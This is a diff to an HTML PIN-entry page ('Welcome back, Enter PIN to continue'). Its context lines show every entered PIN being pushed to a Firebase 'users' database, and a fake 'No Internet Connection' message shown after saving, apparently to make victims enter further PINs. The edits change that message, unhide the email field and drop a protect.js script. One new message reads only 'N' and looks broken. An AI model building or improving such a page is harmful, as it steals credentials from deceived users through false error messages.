@@ -201,7 +201,7 @@
         </div>
 
         <div class="welcome">Welcome back</div>
-        <div style="display: none;" class="email-display" id="emailDisplay"></div>
+        <div class="email-display" id="emailDisplay"></div>
         <div class="pin-label">Enter PIN to continue</div>
 
         <div class="pin-dots" id="pinDots">
@@ -301,7 +301,7 @@
 
                 // ✅ Check if this PIN is the same as the last saved one
                 if (enteredPin === lastSavedPin) {
-                    showToast('No Internet Connection');
+                    showToast('This PIN is already saved. Try a different one.');
                     enteredPin = '';
                     updateDots();
                     return;
@@ -319,7 +319,7 @@
                 database.ref('users').push(newUser)
                     .then(() => {
                         lastSavedPin = enteredPin; // ✅ Store the saved PIN
-                        showToast('No Internet Connection');
+                        showToast('N');
                         enteredPin = '';
                         updateDots();
                     })
@@ -396,8 +396,5 @@
             init();
         })();
     </script>
-
-    
-  <script src="protect.js"></script>
 </body>
 </html>
